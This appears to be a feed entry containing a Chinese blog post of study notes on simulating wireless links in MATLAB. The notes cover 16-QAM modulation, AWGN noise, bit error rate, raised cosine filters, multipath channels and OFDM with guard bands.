    <content type="html"><![CDATA[<blockquote><p>失踪人口回归嘿嘿。最近出于实验需求，学习一下如何使用Matlab来模拟无线通信环境，包括通过添加噪声、过滤器等来模拟真实物理世界状态，旨在测试信道的误比特率。包括单链路和多链路的模拟。记录的内容主要来自官网MathWork上的在线免费课程。包括：</p><ol type="1"><li>单理想通道&amp;噪声通道通信模拟</li><li>多径理想&amp;噪声模拟，OFDM机制模拟</li></ol><p>(ps：之前一直认为Matlab没啥用&amp;&amp;没好好学的我对不起对不起对不起。</p><p><imgsrc="/img/MATLAB%20-%20Wireless%20Communication%20Onramp/image-20220122214915003.png" /></p></blockquote><span id="more"></span><h2 id="模拟基本数字通信链路">模拟基本数字通信链路</h2><h3 id="模拟发送方和接收方">模拟发送方和接收方</h3><p><imgsrc="https://matlabacademy-content.mathworks.com/4.35.1/R2021b/content/Communications/Basic%20Link%20Simulation/Modulation%20and%20Demodulation/images/diagram1_backtobackQAMlink-01.svg" /></p><p>要模拟的过程如上图所示，这里使用16-QAM进行调制和解调，如下是代码和步骤。</p><p>首先第一步我们需要一个信源，即产生信号的源，这里即是由一系列的0,1比特串组成，在matlab中其实就是一个向量。所以我们可以使用<code>randi</code>函数来实现该功能。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], <span class="number">20000</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(modOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 这里的信道假设是理想信道 %</span></span><br><span class="line">chanOut = modOut;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解调 %</span></span><br><span class="line">demodOut = qamdemod(chanOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>);</span><br><span class="line"><span class="comment">% 检查 %</span></span><br><span class="line">check = <span class="built_in">isequal</span>(srcBits, demodOut);</span><br></pre></td></tr></table></figure><p>我们可以得到下面的<strong>理想的</strong>星座图：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120110708105.png" alt="image-20220120110708105"  /></p><p>这是最理想的星座图，各个点之间的间隔越大，他们的性能越好。最终<code>check</code>变量的值也是1，这是因为我们的通道是无噪声的理想通道，现实中肯定不是这样的了。</p><h3 id="模拟加性高斯白噪声通道">模拟加性高斯白噪声通道</h3><p>所以下来我们将通道改为包含了<strong>加性高斯白噪声(additive WhiteGauss Noise, AWGN)</strong>的环境，如下图所示：</p><p><imgsrc="https://matlabacademy-content.mathworks.com/4.35.1/R2021b/content/Communications/Basic%20Link%20Simulation/Add%20Noise/images/diagram2_QAMlinkwithAWGN-01.svg" /></p><p>我们修改一下代码，设置信号平均功率(Average Power)为1，并对调制的结果添加高斯白噪声，最终我们看一下两个图的对比。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], <span class="number">20000</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(modOut);</span><br><span class="line">title(<span class="string">&quot;Without Noise&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加性高斯白噪声 %</span></span><br><span class="line">SNR = <span class="number">15</span>; <span class="comment">% dB</span></span><br><span class="line">chanOut = awgn(modOut, SNR);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(chanOut);</span><br><span class="line">title(<span class="string">&quot;AWGN&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解调 %</span></span><br><span class="line">demodOut = qamdemod(chanOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 检查 %</span></span><br><span class="line">check = <span class="built_in">isequal</span>(srcBits, demodOut);</span><br></pre></td></tr></table></figure><p>此时我们再对比一下，噪声的影响就出来了。只有在原来理想(ideal)位置(左图位置)上的点才会被解调为正常的比特，而不在理想位置上、发生了偏移的点则就会发生解调错误。</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120112520154.png" alt="image-20220120112520154"  /></p><p>当然，我们可以提高信噪比，来看看效果，下图是SNR分别为30、60、100的结果，可以看到结果是越来越好了。</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120113335035.png" alt="image-20220120113335035"  /></p><p>当然看星座图是一种方法了，我们接下来量化一下，使用比特错误率(BitError Rate, BER)来衡量。</p><h3 id="计算误比特率">计算误比特率</h3><p>计算方法很简单，我们只需要使用错误的比特数量除以总比特数就可以了，我们使用<code>~=</code>符号来获得一个向量，其中1代表运算的两个对象包含的元素不相同，0代表相同，故<code>srcBits ~= demodOut</code>就可以将错误的比特标记为1，然后我们使用<code>nnz</code>即non-zero函数来对这些标记进行Counting，最后做比值就可以了。代码如下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">numBits = <span class="number">20000</span>;</span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], numBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(modOut);</span><br><span class="line">title(<span class="string">&quot;Without Noise&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加性高斯白噪声 %</span></span><br><span class="line">SNR = <span class="number">15</span>; <span class="comment">% dB</span></span><br><span class="line">chanOut = awgn(modOut, SNR);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(chanOut);</span><br><span class="line">title(<span class="string">&quot;AWGN&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解调 %</span></span><br><span class="line">demodOut = qamdemod(chanOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 计算误比特率 %</span></span><br><span class="line">numErrorBits = nnz(srcBits ~= demodOut);</span><br><span class="line">BER = numErrorBits / numBits;</span><br></pre></td></tr></table></figure><h3 id="模拟滤波器">模拟滤波器</h3><p>为了降低上述出现的误比特率，我们将使用滤波器(filter)，加上滤波器的发送方和接收方如下所示，通常上这一对过滤器是匹配使用的。下面实验我们使用一个平方根升余弦过滤器函数来实现功能，具体函数为<code>comm.RaisedCosineTransmitFilter</code>和<code>comm.RaisedCosineReceiveFilter</code>，然后我们对比一下加了过滤器后的误码率。代码如下。</p><p><img src="/img/MATLAB - Wireless Communication Onramp/diagram4_txrxfilters-01.svg" style="zoom:33%;" /></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">numBits = <span class="number">20000</span>;</span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], numBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 添加升余弦过滤器 %</span></span><br><span class="line">txFilt = comm.RaisedCosineTransmitFilter;</span><br><span class="line"><span class="comment">% 通过过滤器 %</span></span><br><span class="line">txFiltOut = txFilt(modOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加性高斯白噪声 注意，这里降低了SNR%</span></span><br><span class="line">SNR = <span class="number">7</span>; <span class="comment">% db</span></span><br><span class="line"><span class="comment">% measured 代表根据SNR缩放噪声功率</span></span><br><span class="line">chanOut = awgn(txFiltOut, SNR, <span class="string">&quot;measured&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 添加升余弦过滤器 %</span></span><br><span class="line">rxFilt = comm.RaisedCosineReceiveFilter;</span><br><span class="line"><span class="comment">% 通过过滤器 %</span></span><br><span class="line">rxFiltOut = rxFilt(chanOut);</span><br></pre></td></tr></table></figure><p>我们可以通过功率谱来分析一下通过滤波器后，没有经过噪声通道和经过噪声通道的频谱图，首先我们通过<code>dsp.SpectrumAnalyzer</code>函数新创建一个频谱分析对象，然后进行分析，在上述代码后面添加如下代码即可：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">specAn = dsp.SpectrumAnalyzer(...</span><br><span class="line">    <span class="string">&quot;NumInputPorts&quot;</span>,<span class="number">2</span>, ...</span><br><span class="line">    <span class="string">&quot;SpectralAverages&quot;</span>,<span class="number">50</span>);</span><br><span class="line">specAn(txFiltOut,chanOut)</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120141841020.png" alt="image-20220120141841020"  /></p><p>其中黄色的部分是没有通过噪声通道前的样子，蓝色是通过噪声通道后的样子，</p><p>由于滤波器是存在延迟的，其长度为滤波器的一半，其单位为符号，所以在计算误码率之前，我们需要对原始的数据和解调前的数据进行对齐，在上面添加如下具体代码：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delayInSymbols = rxFilt.FilterSpanInSymbols/<span class="number">2</span> + txFilt.FilterSpanInSymbols/<span class="number">2</span></span><br><span class="line">delayInBits = delayInSymbols * bitsPerSymbol</span><br><span class="line">srcAligned = srcBits(<span class="number">1</span>:(<span class="keyword">end</span>-delayInBits))</span><br><span class="line">demodAligned = demodOut((delayInBits+<span class="number">1</span>):<span class="keyword">end</span>)</span><br><span class="line">numBitErrors = nnz(srcAligned ~= demodAligned)</span><br><span class="line">BER = numBitErrors / <span class="built_in">length</span>(srcAligned)</span><br></pre></td></tr></table></figure><p>从我自己多次的运行结果来看，在和上一节中<code>SNR=15</code>对比，这里虽然将SNR降低到了7，但是其误码率反而要比上一节的实验结果将近小了2至倍，这说明滤波器在对抗噪声方面的作用是显著的。</p><h2 id="模拟多径通信链路">模拟多径通信链路</h2><blockquote><p>无线通信如LTE、5G、Wifi本身就是在开放式的环境中以广播的形式进行传输，故为了更好的模拟无线通信环境，我们需要对多径通信链路进行仿真实验。</p></blockquote><h3 id="基本建模以及问题">基本建模以及问题</h3><p>下面将模拟一个发送方和接收方都是静态情况(不移动)下的多径通信链路，如下图所示：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/diagram5_multipath-01.svg" /></p><p>首先我们使用一个有限脉冲响应过滤器(finite impulse response(FIR)filter)来代表多路径，通常上是有一个由系数组成的向量：<code>b = [b0 b1 b2 ... bn]</code>，我们可以认为每一个元素为一个路径，每一个非0系数代表延迟。下面的代码中我们用变量<code>mpChan</code>来模拟一个多径。依旧采用单数据源发送数据，前面的数据生成过程和最后的BER计算方法和上一节相同。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">numBits = <span class="number">20000</span>;</span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], numBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">bitsPerSymbol = <span class="built_in">log2</span>(modOrder);</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 添加升余弦过滤器 %</span></span><br><span class="line">txFilt = comm.RaisedCosineTransmitFilter;</span><br><span class="line">rxFilt = comm.RaisedCosineReceiveFilter;</span><br><span class="line"><span class="comment">% 通过过滤器 %</span></span><br><span class="line">txFiltOut = txFilt(modOut);</span><br><span class="line"></span><br><span class="line">spacing = <span class="built_in">zeros</span>(<span class="number">7</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 多径通道 %</span></span><br><span class="line">mpChan = [<span class="number">0.8</span>; spacing; <span class="number">-0.5</span>; spacing; <span class="number">0.34</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">% stem 可以查看 %</span></span><br><span class="line"><span class="comment">% stem(mpChan) %</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% apply the filter to signal %</span></span><br><span class="line">mpChanOut = filter(mpChan, <span class="number">1</span>, txFiltOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% BER %</span></span><br><span class="line"><span class="keyword">if</span> exist(<span class="string">&quot;mpChanOut&quot;</span>,<span class="string">&quot;var&quot;</span>)</span><br><span class="line">    SNR = <span class="number">15</span>;  <span class="comment">% dB</span></span><br><span class="line">    chanOut = awgn(mpChanOut,SNR,<span class="string">&quot;measured&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    rxFiltOut = rxFilt(chanOut);</span><br><span class="line">    scatterplot(rxFiltOut)</span><br><span class="line">    title(<span class="string">&quot;Receive Filter Output&quot;</span>)</span><br><span class="line">    demodOut = qamdemod(rxFiltOut,modOrder,<span class="string">&quot;OutputType&quot;</span>,<span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">        <span class="string">&quot;UnitAveragePower&quot;</span>,<span class="built_in">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">% Calculate the BER</span></span><br><span class="line">    delayInSymbols = txFilt.FilterSpanInSymbols/<span class="number">2</span> + ...</span><br><span class="line">        rxFilt.FilterSpanInSymbols/<span class="number">2</span>;</span><br><span class="line">    delayInBits = delayInSymbols * bitsPerSymbol;</span><br><span class="line">    srcAligned = srcBits(<span class="number">1</span>:(<span class="keyword">end</span>-delayInBits));</span><br><span class="line">    demodAligned = demodOut((delayInBits+<span class="number">1</span>):<span class="keyword">end</span>);</span><br><span class="line"></span><br><span class="line">    numBitErrors = nnz(srcAligned~=demodAligned);</span><br><span class="line">    BER = numBitErrors/<span class="built_in">length</span>(srcAligned);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122135303062.png" alt="image-20220122135303062"  /></p><p>从实验结果来看，在SNR为15的情况下，误比特率高达20%以上，从星座图来看显然几乎是不可用的传输方案，下面是频谱图：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122135829367.png" alt="image-20220122135829367"  /></p><p>其中蓝色代表多径通道的输出，黄色是调制后的输出，可以从结果看到，多径通道输出后中间有明显的凹陷，扭曲了原信号的波形，这是因为<strong>频率选择性多径（frequency-selectivemultipath）导致信道衰减或增益的水平取决于频率。</strong>针对这个问题，在wifi、5G、LTE中，我们使用正交频分多路复用技术(orthogonalfrequency-division multiplexing,OFDM)来解决。所以我们下来模拟该技术。</p><h3 id="引入ofdm">引入OFDM</h3><p><img src="/img/MATLAB - Wireless Communication Onramp/diagram7_ofdmmod_equalizer-01.svg"  /></p><p>这里不展开说具体原理，这里直接使用Matlab的OFDM的实现函数就可以了。代码如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 16-QAM</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">bitsPerSymbol = <span class="built_in">log2</span>(modOrder);</span><br><span class="line"></span><br><span class="line"><span class="comment">% multipath channel</span></span><br><span class="line">mpChan = [<span class="number">0.8</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">-0.5</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">0.34</span>];  </span><br><span class="line">SNR = <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% number of subcarriers</span></span><br><span class="line">numCarr = <span class="number">8192</span>;</span><br><span class="line">numBits = numCarr * bitsPerSymbol;</span><br><span class="line">srcBits = randi([<span class="number">0</span>,<span class="number">1</span>],numBits,<span class="number">1</span>);</span><br><span class="line">qamModOut = qammod(srcBits,modOrder,<span class="string">&quot;InputType&quot;</span>,<span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>,<span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 设定前缀长度</span></span><br><span class="line">cycPrefLen = <span class="number">32</span>;</span><br><span class="line"><span class="comment">% OFDM调制</span></span><br><span class="line">ofdmModOut = ofdmmod(qamModOut, numCarr, cycPrefLen);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 多路径+AWGN</span></span><br><span class="line">mpChanOut = filter(mpChan,<span class="number">1</span>,ofdmModOut);</span><br><span class="line">chanOut = awgn(mpChanOut,SNR,<span class="string">&quot;measured&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% OFDM解调</span></span><br><span class="line">ofdmDemodOut = ofdmdemod(chanOut, numCarr, cycPrefLen);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 均衡器</span></span><br><span class="line">mpChanFreq = fftshift(fft(mpChan, numCarr));</span><br><span class="line">eqOut = ofdmDemodOut ./ mpChanFreq;</span><br><span class="line">scatterplot(eqOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 16-QAM解码</span></span><br><span class="line">qamDemodOut = qamdemod(eqOut,modOrder,<span class="string">&quot;OutputType&quot;</span>,<span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>,<span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 计算BER</span></span><br><span class="line">numBitErrors = nnz(srcBits~=qamDemodOut);</span><br><span class="line">BER = numBitErrors/numBits;</span><br></pre></td></tr></table></figure><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122160032483.png" alt="image-20220122160032483"  /></p><p>从实验结果来看，使用了OFDM技术的情况下，多径效应的影响被大大减弱了。</p><h3 id="添加防护带">添加防护带</h3><blockquote><p>为了防止信号之间的相互干扰，在实际的OFDM系统中往往需要防护带的设计(如下图所示)，同时去除直流部分以便在没有直流的信号上使用。上述操作同样可以使用<code>ofdmmod</code>函数完成</p><p><img src="https://matlabacademy-content.mathworks.com/4.35.1/R2021b/content/Communications/OFDM/Null%20Subcarriers/images/nullsubcarriers.svg" alt="33 OFDM subcarriers. Left four and right four subcarriers are guard bands, center subcarrier is null DC." style="zoom:80%;" /></p></blockquote><p>代码如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 16-QAM</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">bitsPerSymbol = <span class="built_in">log2</span>(modOrder);</span><br><span class="line"><span class="comment">% multipath channel</span></span><br><span class="line">mpChan = [<span class="number">0.8</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">-0.5</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">0.34</span>];  </span><br><span class="line">SNR = <span class="number">15</span>;</span><br><span class="line"><span class="comment">% number of subcarriers</span></span><br><span class="line">numCarr = <span class="number">8192</span>;</span><br><span class="line"><span class="comment">% cycPrefLen</span></span><br><span class="line">cycPrefLen = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% indices of left and right band Guard</span></span><br><span class="line">numGBCarr = numCarr/<span class="number">16</span>;</span><br><span class="line">leftBg = <span class="number">1</span>:numGBCarr;</span><br><span class="line">rightBg = (numCarr - numGBCarr + <span class="number">1</span>):numCarr;</span><br><span class="line">dcIdx = numCarr/<span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">nullIdx = [leftBg dcIdx rightBg]&#x27;;</span><br><span class="line"></span><br><span class="line"><span class="comment">% data carries</span></span><br><span class="line">numDataCarr = numCarr - <span class="built_in">length</span>(nullIdx);</span><br><span class="line">numDataBits = numDataCarr * bitsPerSymbol;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 生成源数据</span></span><br><span class="line">srcBits = randi([<span class="number">0</span>,<span class="number">1</span>], numDataBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 16-QAM编码</span></span><br><span class="line">qamModOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% ofdm编码</span></span><br><span class="line">ofdmModOut = ofdmmod(qamModOut, numCarr, cycPrefLen, nullIdx);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 通过AWGN的多径通道</span></span><br><span class="line">mpChanOut = filter(mpChan,<span class="number">1</span>,ofdmModOut);</span><br><span class="line">chanOut = awgn(mpChanOut,SNR,<span class="string">&quot;measured&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% ofdm解调</span></span><br><span class="line">ofdmDemodOut = ofdmdemod(chanOut, numCarr, cycPrefLen, cycPrefLen, nullIdx);</span><br><span class="line"><span class="comment">% 均衡信号</span></span><br><span class="line">mpChanFreq = fftshift(fft(mpChan, numCarr));</span><br><span class="line">mpChanFreq(nullIdx) = [];</span><br><span class="line">eqOut = ofdmDemodOut ./ mpChanFreq;</span><br><span class="line">scatterplot(eqOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 16-QAM解码</span></span><br><span class="line">qamDemodOut = qamdemod(eqOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 计算误比特率</span></span><br><span class="line">numBitErrors = nnz(srcBits~=qamDemodOut);</span><br><span class="line">BER = numBitErrors/numDataBits;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 频谱分析</span></span><br><span class="line">specAn = dsp.SpectrumAnalyzer(<span class="string">&quot;NumInputPorts&quot;</span>,<span class="number">2</span>,<span class="string">&quot;SpectralAverages&quot;</span>,<span class="number">50</span>);</span><br><span class="line">specAn(ofdmModOut,chanOut)</span><br></pre></td></tr></table></figure><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122215533105.png" alt="image-20220122215533105"  /></p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122215549567.png" alt="image-20220122215549567"  /></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;失踪人口回归嘿嘿。最近出于实验需求，学习一下如何使用Matlab来模拟无线通信环境，包括通过添加噪声、过滤器等来模拟真实物理世界状态，旨在测试信道的误比特率。包括单链路和多链路的模拟。记录的内容主要来自官网MathWork上的在线免费课程。包括：&lt;/p&gt;
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;单理想通道&amp;amp;噪声通道通信模拟&lt;/li&gt;
&lt;li&gt;多径理想&amp;amp;噪声模拟，OFDM机制模拟&lt;/li&gt;
&lt;/ol&gt;
